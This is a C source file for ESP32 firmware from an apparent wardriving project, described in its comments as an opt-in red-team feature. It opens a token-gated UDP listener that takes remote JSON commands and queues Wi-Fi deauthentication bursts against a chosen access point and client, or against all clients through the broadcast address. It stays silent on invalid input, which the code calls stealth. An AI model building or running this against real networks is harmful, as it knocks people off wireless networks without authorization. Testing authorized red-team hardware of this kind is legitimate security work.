/*
 * deauth_udp — Listener UDP de control para ráfagas deauth (opt-in Red Team).
 */

#include "deauth_udp.h"

#if CONFIG_WARDRIVE_DEAUTH_ENABLE

#include <errno.h>
#include <stdio.h>
#include <string.h>

#include "cJSON.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/sockets.h"

#include "deauth_tx.h"
#include "session.h"

static const char *TAG = "DEAUTH_UDP";

#define CTRL_PORT        47472
#define RX_BUF_LEN       512
#define TOKEN_MAX        64

static bool parse_mac(const char *str, uint8_t out[6])
{
    if (str == NULL || strlen(str) != 17) {
        return false;
    }
    unsigned v[6];
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; i++) {
        out[i] = (uint8_t)v[i];
    }
    return true;
}

static void send_json(int sock, const struct sockaddr_in *dest, const char *json)
{
    sendto(sock, json, strlen(json), 0, (const struct sockaddr *)dest, sizeof(*dest));
}

static void udp_task(void *pv)
{
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        ESP_LOGE(TAG, "socket: errno %d", errno);
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(CTRL_PORT);
    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) != 0) {
        ESP_LOGE(TAG, "bind :%u: errno %d", CTRL_PORT, errno);
        close(sock);
        vTaskDelete(NULL);
        return;
    }
    ESP_LOGW(TAG, "Control deauth ACTIVO en udp/%u (token requerido)", CTRL_PORT);

    char rxb[RX_BUF_LEN];
    while (true) {
        struct sockaddr_in src = {0};
        socklen_t slen = sizeof(src);
        int n = recvfrom(sock, rxb, sizeof(rxb) - 1, 0, (struct sockaddr *)&src, &slen);
        if (n <= 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }
        rxb[n] = '\0';

        cJSON *root = cJSON_Parse(rxb);
        if (root == NULL) {
            continue; /* Payload inválido: sin respuesta (stealth). */
        }
        const char *cmd = cJSON_GetStringValue(cJSON_GetObjectItem(root, "cmd"));
        const char *token = cJSON_GetStringValue(cJSON_GetObjectItem(root, "token"));

        /* Gate de token: sin token válido no se responde NADA. */
        if (token == NULL || strlen(token) == 0 ||
            strlen(token) > TOKEN_MAX ||
            strcmp(token, CONFIG_WARDRIVE_DEAUTH_TOKEN) != 0) {
            cJSON_Delete(root);
            continue;
        }

        if (cmd != NULL && strcmp(cmd, "ping") == 0) {
            char resp[96];
            snprintf(resp, sizeof(resp), "{\"type\":\"pong\",\"session\":\"%s\"}", session_get_id());
            send_json(sock, &src, resp);
        } else if (cmd != NULL && strcmp(cmd, "deauth") == 0) {
            deauth_request_t req = {0};
            const char *bssid_s = cJSON_GetStringValue(cJSON_GetObjectItem(root, "bssid"));
            const char *sta_s = cJSON_GetStringValue(cJSON_GetObjectItem(root, "sta"));
            cJSON *ch_j = cJSON_GetObjectItem(root, "channel");
            cJSON *reason_j = cJSON_GetObjectItem(root, "reason");
            cJSON *count_j = cJSON_GetObjectItem(root, "count");

            bool ok = parse_mac(bssid_s, req.bssid);
            if (ok && sta_s != NULL) {
                parse_mac(sta_s, req.sta);
            } else if (ok) {
                memcpy(req.sta, (uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, 6);
            }
            req.channel = (ch_j != NULL && cJSON_IsNumber(ch_j)) ? (uint8_t)ch_j->valueint : 0;
            req.reason = (reason_j != NULL && cJSON_IsNumber(reason_j)) ? (uint16_t)reason_j->valueint : 1;
            req.count = (count_j != NULL && cJSON_IsNumber(count_j)) ? (uint8_t)count_j->valueint : 1;

            if (!ok || req.channel < 1 || req.channel > 14 || req.count < 1) {
                send_json(sock, &src, "{\"type\":\"error\",\"error\":\"bad_request\"}");
            } else {
                if (req.count > CONFIG_WARDRIVE_DEAUTH_MAX_BURST) {
                    req.count = CONFIG_WARDRIVE_DEAUTH_MAX_BURST;
                }
                if (req.count > DEAUTH_MAX_COUNT) {
                    req.count = DEAUTH_MAX_COUNT;
                }
                if (deauth_tx_enqueue(&req)) {
                    char resp[80];
                    snprintf(resp, sizeof(resp), "{\"type\":\"queued\",\"count\":%u}", req.count);
                    send_json(sock, &src, resp);
                } else {
                    send_json(sock, &src, "{\"type\":\"error\",\"error\":\"rate_limited_or_full\"}");
                }
            }
        }
        cJSON_Delete(root);
    }
}

esp_err_t deauth_udp_start(void)
{
    if (CONFIG_WARDRIVE_DEAUTH_TOKEN[0] == '\0') {
        ESP_LOGW(TAG, "WARDRIVE_DEAUTH_TOKEN vacío: canal de control INACTIVO");
        return ESP_ERR_INVALID_STATE;
    }
    deauth_tx_init();
    if (xTaskCreate(udp_task, "deauth_udp", 4096, NULL, 4, NULL) != pdPASS) {
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

#else /* !CONFIG_WARDRIVE_DEAUTH_ENABLE */

esp_err_t deauth_udp_start(void)
{
    return ESP_ERR_NOT_SUPPORTED;
}

#endif /* CONFIG_WARDRIVE_DEAUTH_ENABLE */
